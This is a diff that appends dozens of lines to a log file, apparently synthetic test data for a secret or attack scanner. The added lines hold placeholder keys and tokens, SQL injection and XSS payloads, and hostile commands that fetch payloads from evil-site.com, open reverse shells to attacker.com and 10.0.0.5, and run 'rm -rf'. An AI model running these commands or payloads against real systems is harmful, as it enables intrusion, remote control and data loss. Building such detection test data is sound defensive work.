@@ -5,7 +5,44 @@ INFO File uploaded: invoice.pdf
 WARN admin token exposed: ghp_exampletoken
 ERROR XSS payload: <script>alert(1)</script>
 INFO Logout user=alice
+INFO Contact admin@test.com immediately 
+INFO Request made to /api/users/profile
 admin password is secret
 password=12345
-
+INFO AWS key found: AKIA1234567890ABCDE
+AWS key leaked: AKIA1234567890ABCDEF
+INFO Suspicious login from 192.168.1.25
+INFO username="test_user"
+Authorization: Bearer eyJHbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature123
+GitHub token leaked: ghp_abcdefghijklmnoprstuvwxyz123
+WARN Login attempt username=admin' OR 1=1 --
+WARN SQL attack detected: UNION SELECT password FROM users
+WARN IMG exploit: <img src=x onerror=alert(1)>
+WARN BODY exploit: <body onload=alert('xss')>
+WARN Weak password detected: password123
+WARN Admin login using admin123
+WARN Admin endpoint accessed: /admin/dashboard
+WARN Debug endpoint exposed: /debug/config
+WARN Authorization header uses Basic QWxhZGRpbjpPcGVuU2VzYW1l
+WARN Shell execution detection: os.system(cmd)
+WARN Subprocess execution: subprocess.Popen(user_command)
+WARN poershell Invoke-WebRequest http://evil-site.com/payload.exe
+WARN Encoded command detected: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACk=
+WARN wget http://evil-site.com/backdoor.sh
+WARN nc -e /bin/sh attacker.com 4444
+WARN Shell execution detected: os.system("rm -rf")
+WARN User attempt access to admin_panel
+WARN Unauthorized access to admin_panel
+ERROR XSS payload: javascript:alert('owned')
+ERROR User account using qwerty password
+ERROR Authorization header leaked: Authorization: Bearer eyJHbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature123
+ERROR Default credentials detected admin:admin
+ERROR Possible login bypass attempt: ' OR 1=1 --
+ERROR Unsafe deserialization: pickle.loads(user_data)
+ERROR SQL injection attempt detected: ' OR 1=1 --
+ERROR XSS payload: <script>alert(1)</script>
+CRITICAL Dangerous eval detected: eval(user_input)
+ALERT powershell.exe -ExecutionPolicy Bypass
+ALERT curl http://evil-site.com/malware.exe
+ALERT bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
 
